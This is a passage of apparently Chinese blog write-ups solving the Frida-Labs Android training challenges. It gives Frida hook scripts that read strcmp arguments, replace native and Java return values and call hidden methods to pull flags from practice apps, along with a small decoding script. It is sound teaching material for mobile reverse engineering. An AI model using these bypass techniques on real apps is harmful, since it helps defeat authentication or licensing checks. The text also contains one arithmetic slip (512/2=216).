<code>strcmp</code> 将用户输入 ( <code>inputStr</code> ) 与调整后的密码 ( <code>password</code> ) 进行比较。</p><p>结果存储在变量 <code>result</code> 中。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int result = strcmp(inputStr, password);</span><br></pre></td></tr></table></figure><p>释放与输入字符串关联的资源。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">env-&gt;ReleaseStringUTFChars(str, inputStr);</span><br></pre></td></tr></table></figure><p>如果字符串相等则返回 1，如果不相等则返回 0。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">return (result == 0) ? 1 : 0;</span><br></pre></td></tr></table></figure><p>4、所以，这块要得到用户正确的输入，有两种办法：</p><ul><li>方法一：写脚本，对硬编码字符串进行循环操作后，得到正确输入</li><li>方法二：直接hook函数 strcmp ，获取它的第二个参数，得到正确输入</li></ul><h2 id="方法一：Python脚本"><a href="#方法一：Python脚本" class="headerlink" title="方法一：Python脚本"></a>方法一：Python脚本</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">str1 = <span class="string">&quot;GSJEB|OBUJWF`MBOE~&quot;</span></span><br><span class="line">str2 = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(str1)):</span><br><span class="line">    s = <span class="built_in">chr</span>(<span class="built_in">ord</span>(str1[i]) - <span class="number">1</span>)</span><br><span class="line">    str2 = str2+s</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(str2)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407281155859.png" alt="image.png"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407281155109.png" alt="image.png"> </p><h2 id="方法二：hook函数-strcmp"><a href="#方法二：hook函数-strcmp" class="headerlink" title="方法二：hook函数 strcmp"></a>方法二：hook函数 strcmp</h2><h3 id="常见API介绍"><a href="#常见API介绍" class="headerlink" title="常见API介绍"></a>常见API介绍</h3><p>要Hook Native层的函数，有对应的Frida API，如下所示：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(targetAddress, &#123;</span><br><span class="line">    <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Entering &#x27;</span> + functionName);</span><br><span class="line">        <span class="comment">// Modify or log arguments if needed</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">onLeave</span>: <span class="keyword">function</span> (<span class="params">retval</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Leaving &#x27;</span> + functionName);</span><br><span class="line">        <span class="comment">// Modify or log return value if needed</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><code>Interceptor.attach</code> ：将回调附加到指定的函数地址。 <code>targetAddress</code> 应该是我们要挂钩的本机函数的地址。</p><p><code>onEnter</code> ：进入挂钩函数时调用此回调。它提供对函数参数（ <code>args</code> ）的访问。</p><p><code>onLeave</code> ：当挂钩函数即将退出时调用此回调。它提供对返回值 ( <code>retval</code> ) 的访问。</p><p>同时，获取Native中特定函数的地址，也可以调用Frida API：</p><h4 id="（1）Module-enumerateExports"><a href="#（1）Module-enumerateExports" class="headerlink" title="（1）Module.enumerateExports()"></a>（1）<strong>Module.enumerateExports()</strong></h4><p>获取 <code>libfrida0x8.so</code> 的所有导出函数</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407281157472.png" alt="image.png"> </p><h4 id="（2）Module-getExportByName"><a href="#（2）Module-getExportByName" class="headerlink" title="（2）Module.getExportByName()"></a>（2）<strong>Module.getExportByName()</strong></h4><p>函数从模块（共享库）中检索具有给定名称的导出符号的地址</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407281157230.png" alt="image.png"> </p><h4 id="（3）Module-findExportByName"><a href="#（3）Module-findExportByName" class="headerlink" title="（3）Module.findExportByName()"></a>（3）<strong>Module.findExportByName()</strong></h4><p>它与 <code>Module.getExportByName()</code> 相同。唯一的区别是，如果未找到导出， <code>Module.getExportByName()</code> 会引发异常，而如果未找到导出， <code>Module.findExportByName()</code> 将返回 <code>null</code> 。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407281158978.png" alt="image.png"> </p><h4 id="（4）Module-getBaseAddress"><a href="#（4）Module-getBaseAddress" class="headerlink" title="（4）Module.getBaseAddress()"></a>（4）<strong>Module.getBaseAddress()</strong></h4><p>有时，如果上述 API 不起作用，我们可以依靠 <code>Module.getBaseAddress()</code> ，该 API 返回给定模块的基地址。让我们找到 <code>libfrida0x8.so</code> 库的基地址。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407281158970.png" alt="image.png"> </p><p>如果我们想找到特定函数的地址，我们只需添加偏移量即可。为了找到偏移量，我们可以使用 ghidra。我们用这种方式找到 <code>cmpstr</code> 的地址。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407281159786.png" alt="image.png"> </p><p>偏移量为 <code>0x8c0</code> 。 将 <code>0x8c0</code> 添加到 <code>0x7f59bbbf6000</code> 得到 <code>0x7f59bbbf68c0</code> 。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407281159711.png" alt="img"> </p><h4 id="（5）Module-enumerateImports"><a href="#（5）Module-enumerateImports" class="headerlink" title="（5）Module.enumerateImports()"></a>（5）<strong>Module.enumerateImports()</strong></h4><p>枚举全部的导入函数</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407281159428.png" alt="image.png"> </p><h3 id="Hook操作"><a href="#Hook操作" class="headerlink" title="Hook操作"></a>Hook操作</h3><p>通过Module.enumerateImports()可以枚举全部的导入函数，在里面可以看到<code>strcmp</code> 函数</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407281159569.png" alt="img"> </p><p>下面开始写脚本如下：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> strcmp_adr = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;libc.so&quot;</span>, <span class="string">&quot;strcmp&quot;</span>);</span><br><span class="line"><span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(strcmp_adr, &#123;</span><br><span class="line">    <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> arg0 = <span class="title class_">Memory</span>.<span class="title function_">readUtf8String</span>(args[<span class="number">0</span>]); <span class="comment">// first argument</span></span><br><span class="line">        <span class="keyword">var</span> flag = <span class="title class_">Memory</span>.<span class="title function_">readUtf8String</span>(args[<span class="number">1</span>]); <span class="comment">// second argument</span></span><br><span class="line">        <span class="keyword">if</span> (arg0.<span class="title function_">includes</span>(<span class="string">&quot;Hello&quot;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Hookin the strcmp function&quot;</span>);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Input &quot;</span> + arg0);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;The flag is &quot;</span>+ flag);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">onLeave</span>: <span class="keyword">function</span> (<span class="params">retval</span>) &#123;</span><br><span class="line">        <span class="comment">// Modify or log return value if needed</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407281159597.png" alt="img"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407281200207.png" alt="image.png"> </p><h1 id="challenge-0x09"><a href="#challenge-0x09" class="headerlink" title="challenge 0x09"></a>challenge 0x09</h1><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407281608125.png" alt="image.png"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407281608480.png" alt="image.png"> </p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">    System.loadLibrary(<span class="string">&quot;a0x9&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (MainActivity.<span class="built_in">this</span>.check_flag() == <span class="number">1337</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Cipher</span> <span class="variable">cipher</span> <span class="operator">=</span> Cipher.getInstance(<span class="string">&quot;AES&quot;</span>);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                cipher.init(<span class="number">2</span>, <span class="keyword">new</span> <span class="title class_">SecretKeySpec</span>(<span class="string">&quot;3000300030003003&quot;</span>.getBytes(), <span class="string">&quot;AES&quot;</span>));</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Toast.makeText(MainActivity.<span class="built_in">this</span>.getApplicationContext(), <span class="string">&quot;You won &quot;</span> + <span class="keyword">new</span> <span class="title class_">String</span>(cipher.doFinal(Base64.getDecoder().decode(<span class="string">&quot;hBCKKAqgxVhJMVTQS8JADelBUPUPyDiyO9dLSS3zho0=&quot;</span>))), <span class="number">1</span>).show();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>JNI函数名为：Java_com_ad2001_a0x9_MainActivity_check_1flag</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407281608915.png" alt="image.png"> </p><p>这块函数默认返回值为1，但是在java层中要求返回值为 1337，才会继续向下执行。这块直接hook函数返回值为1337即可：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> check_flag = <span class="title class_">Module</span>.<span class="title function_">enumerateExports</span>(<span class="string">&quot;liba0x9.so&quot;</span>)[<span class="number">0</span>][<span class="string">&#x27;address&#x27;</span>];</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;check_flag: &quot;</span> + check_flag);</span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(check_flag, &#123;</span><br><span class="line">      <span class="attr">onEnter</span>: <span class="keyword">function</span>(<span class="params">args</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;check_flag called&quot;</span>);</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">onLeave</span>: <span class="keyword">function</span>(<span class="params">retval</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;check_flag returned: &quot;</span> + retval);</span><br><span class="line">        retval.<span class="title function_">replace</span>(<span class="number">1337</span>);  <span class="comment">//【注意】这块需要使用retval.replace来修改返回值</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;check_flag returned: &quot;</span> + retval);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">setImmediate</span>(main);</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407281609189.png" alt="image.png"> </p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> frida-labs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>frida-labs(1)</title>
      <link href="/2024/07/27/frida-labs(1)/"/>
      <url>/2024/07/27/frida-labs(1)/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><h2 id="下载地址："><a href="#下载地址：" class="headerlink" title="下载地址："></a>下载地址：</h2><p><a href="https://github.com/DERE-ad2001/Frida-Labs">DERE-ad2001&#x2F;Frida-Labs：该仓库包含一系列学习 Frida for Android Exploitation 的挑战。 — DERE-ad2001&#x2F;Frida-Labs: The repo contains a series of challenges for learning Frida for Android Exploitation. (github.com)</a></p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407271737543.png" alt="image-20240727173730434"> </p><h2 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h2><p>项目中包含了11个不同的实战案例，分别从java层到Native层，介绍了常见的Frida API使用场景：</p><ul><li>challenge 0x01：hook普通方法</li><li>challenge 0x02：调用静态方法</li><li>challenge 0x03：更改变量的值</li><li>challenge 0x04：创建实例对象</li><li>challenge 0x05：在现有实例上调用方法</li><li>challenge 0x06：调用带有对象参数的方法</li><li>challenge 0x07：hook构造函数</li><li>challenge 0x08：hook so层函数</li><li>challenge 0x09：更改so层函数返回值</li><li>challenge 0x0A：调用原生函数</li><li>challenge 0x0B：使用 X86Writer 和 ARM64Writer 修补汇编</li></ul><h1 id="challenge-0x01"><a href="#challenge-0x01" class="headerlink" title="challenge 0x01"></a>challenge 0x01</h1><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407271746119.png" alt="image.png"> </p><p>1、提示【Try again】。使用jadx反编译后打开，定位到关键代码处：</p><ul><li>可以直接搜索 “Try again”，适用于代码较多的情况下</li></ul><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407271746405.png" alt="image.png"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407271746264.png" alt="image.png"> </p><ul><li>代码比较少，可以直接看MainActivity类</li></ul><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407271746195.png" alt="image.png"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407271746956.png" alt="image.png"> </p><p>2、分析代码，可以先定位到 <strong>check</strong> 函数</p><p>当(i * 2) + 4 &#x3D;&#x3D; i2的时候，可以执行下一步的代码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(i * 2) + 4 == i2</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407271747256.png" alt="image.png"> </p><p>3、查看调用了check函数的地方，定位到了 oncreate 函数</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407271747889.png" alt="image.png"> </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MainActivity.this.check(i, Integer.parseInt(obj));</span><br></pre></td></tr></table></figure><p>其中参数 i 和 Integer.parseInt(obj)分别为：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">final int i = get_random();   //通过get_random得到</span><br><span class="line">String obj = editText.getText().toString();  //用户输入</span><br></pre></td></tr></table></figure><p>3、所以，可以得到逻辑为：</p><p>通过get_random()函数得到的随机值，经过运算后，得到我们输入的值即可通过校验。</p><p>所以，这块只需要hook掉 get_random()函数，让他返回一个固定值即可。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407271747367.png" alt="image.png"> </p><p>4、Frida代码如下：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> className = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.ad2001.frida0x1.MainActivity&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> method = className.<span class="property">get_random</span>;</span><br><span class="line"></span><br><span class="line">    method.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;get_random function called&quot;</span>);</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Returning 5&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">5</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">setImmediate</span>(main);</span><br></pre></td></tr></table></figure><p>直接让 get_random 函数的返回值为5，则用户输入应该为 5*2+4&#x3D;14</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407271748402.png" alt="image.png"> </p><h1 id="challenge-0x02"><a href="#challenge-0x02" class="headerlink" title="challenge 0x02"></a>challenge 0x02</h1><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407271750644.png" alt="image.png"> </p><p>1、定位到MainActivity类中，找到了get_flag函数</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407271751607.png" alt="image.png"> </p><p>2、全局搜索，没有发现调用 get_flag函数的地方，也就是说，这块定义了一个函数，但是没有做引用</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407271751074.png" alt="image.png"> </p><p>3、所以，这块使用Frida调用 get_flag函数，并且要求传入的参数为 4919</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407271751803.png" alt="image.png"> </p><p>4、代码如下：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> a = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.ad2001.frida0x2.MainActivity&quot;</span>);</span><br><span class="line">       </span><br><span class="line">        a.<span class="title function_">get_flag</span>(<span class="number">4919</span>);  <span class="comment">// method name</span></span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">setImmediate</span>(main);</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407271752348.png" alt="image.png"> </p><p>5、也可以不写脚本，直接frida中输入代码hook即可：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407271754982.png" alt="image-20240727175406935"> </p><h1 id="challenge-0x03"><a href="#challenge-0x03" class="headerlink" title="challenge 0x03"></a>challenge 0x03</h1><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407271816418.png" alt="image.png"> </p><p>1、jadx查看MainActivity类，定位到了onClick方法：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407271816297.png" alt="image.png"> </p><p>2、查看代码逻辑，当Checker.code &#x3D;&#x3D; 512的时候，执行后续代码，当不等于512的时候，返回 try again！</p><p>定位到Checker.code处：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407271817926.png" alt="image.png"> </p><p>code是一个静态成员变量。</p><p>3、这块有两种方法进行HOOk：</p><p>①直接hook修改静态成本变量Checker.code的值</p><p>②hook increase方法，使用for循环执行 512&#x2F;2&#x3D;216次</p><p>方法一：Hook成员变量</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> a = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.ad2001.frida0x3.Checker&quot;</span>);  <span class="comment">// class reference</span></span><br><span class="line">        a.<span class="property">code</span>.<span class="property">value</span> = <span class="number">512</span>;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">setImmediate</span>(main);</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407271817504.png" alt="image.png"> </p><p>方法二：Hook对应方法</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//方法一</span></span><br><span class="line">        <span class="comment">// var a = Java.use(&quot;com.ad2001.frida0x3.Checker&quot;);  // class reference</span></span><br><span class="line">        <span class="comment">// a.code.value = 512;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//方法二</span></span><br><span class="line">        <span class="keyword">var</span> className = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.ad2001.frida0x3.Checker&quot;</span>);  <span class="comment">// class reference</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">1</span>; i &lt;= <span class="number">256</span>; i++) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Calling increase() method &quot;</span> + i + <span class="string">&quot; times&quot;</span>);</span><br><span class="line">            className.<span class="title function_">increase</span>();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">var</span> code_value = className.<span class="property">code</span>.<span class="property">value</span>;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Current variable value: &quot;</span> + code_value);</span><br><span class="line">        &#125;      </span><br><span class="line">    </span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">setImmediate</span>(main);</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407271818574.png" alt="image.png"> </p><h1 id="challenge-0x04"><a href="#challenge-0x04" class="headerlink" title="challenge 0x04"></a>challenge 0x04</h1><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407271818212.png" alt="image.png"> </p><p>1、jadx反编译后定位到了MainActivity，查看后没有发现有用信息：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407271823551.png" alt="image.png"> </p><p>2、查看另一个类Check，里面定义了一个 get_flag方法</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407271823662.png" alt="image.png"> </p><p>3、要求传入的参数值a &#x3D; 1337，才会继续向下执行。</p><p>由于没有在MainActivity中发现实例化的Check类。</p><p>所以，可以先使用$new()新建一个Check的实例对象，然后调用get_flag方法，打印输出即可。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> check = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.ad2001.frida0x4.Check&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> check_obj = check.$new(); <span class="comment">// Class Object</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> res = check_obj.<span class="title function_">get_flag</span>(<span class="number">1337</span>); <span class="comment">// Calling the method</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;FLAG--1 &quot;</span> + res);</span><br><span class="line"></span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">setImmediate</span>(main);</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407271823924.png" alt="image.png"> </p><p>这块的get_flag方法是非静态方法，创建实例后也可以使用Java.choose来进行hook定位</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> check = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.ad2001.frida0x4.Check&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> check_obj = check.$new(); <span class="comment">// Class Object</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//方法一</span></span><br><span class="line">        <span class="keyword">var</span> res = check_obj.<span class="title function_">get_flag</span>(<span class="number">1337</span>); <span class="comment">// Calling the method</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;FLAG--1 &quot;</span> + res);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//方法二</span></span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">choose</span>(<span class="string">&#x27;com.ad2001.frida0x4.Check&#x27;</span>, &#123;</span><br><span class="line">            <span class="attr">onMatch</span>: <span class="keyword">function</span>(<span class="params">instance</span>)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Found `HookedObject` instance:&quot;</span>, instance);</span><br><span class="line">                <span class="keyword">var</span> res = instance.<span class="title function_">get_flag</span>(<span class="number">1337</span>);</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;FLAG--2 &quot;</span> + res);</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onComplete</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Found Completed&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">setImmediate</span>(main);</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407271824487.png" alt="image.png"> </p><h1 id="challenge-0x05"><a href="#challenge-0x05" class="headerlink" title="challenge 0x05"></a>challenge 0x05</h1><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407271824534.png" alt="image.png"> </p><p>jadx反编译，定位到关键函数：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407271824392.png" alt="image.png"> </p><p>查看关键代码 if (code &#x3D;&#x3D; 1337) 的执行函数后续代码：</p><p>所以，这块可以参考上节demo的做法。</p><p>这块有个问题，就是不能直接 $new 创建一个实例后再调用 flag 方法。</p><p>原因：flag函数在MainActivity类中，一般MainActivity是由程序直接创建的，不会通过代码来调用。</p><p>所以，这块使用 Java.choose 定位到实例，然后再调用即可：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">choose</span>(<span class="string">&quot;com.ad2001.frida0x5.MainActivity&quot;</span>,&#123;</span><br><span class="line">            <span class="attr">onMatch</span>: <span class="keyword">function</span>(<span class="params">instance</span>)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Found MainActivity instance: &quot;</span> + instance);</span><br><span class="line">                instance.<span class="title function_">flag</span>(<span class="number">1337</span>);</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onComplete</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;&#125;</span><br><span class="line">        &#125; )</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">setImmediate</span>(main);</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407271825098.png" alt="be5e86773b1bc66d0102b73b08a3bd8.png"> </p><h1 id="challenge-0x06"><a href="#challenge-0x06" class="headerlink" title="challenge 0x06"></a>challenge 0x06</h1><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407271915745.png" alt="image.png"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407271915856.png" alt="image.png"> </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (1234 == A.num1 &amp;&amp; 4321 == A.num2)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407271915240.png" alt="image.png"> MainActivity中的get_flag方法，传参为 Checker的一个实例。</p><p>但是没有在MainActivity中发现调用get_flag方法的代码，所以，这块需要定位到实例后主动调用；</p><p>因为if判断中对Check类的两个成员变量有要求，所以，还需要实例化一个Check类并对成员变量进行初始化。</p><p>代码如下：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">choose</span>(<span class="string">&#x27;com.ad2001.frida0x6.MainActivity&#x27;</span>, 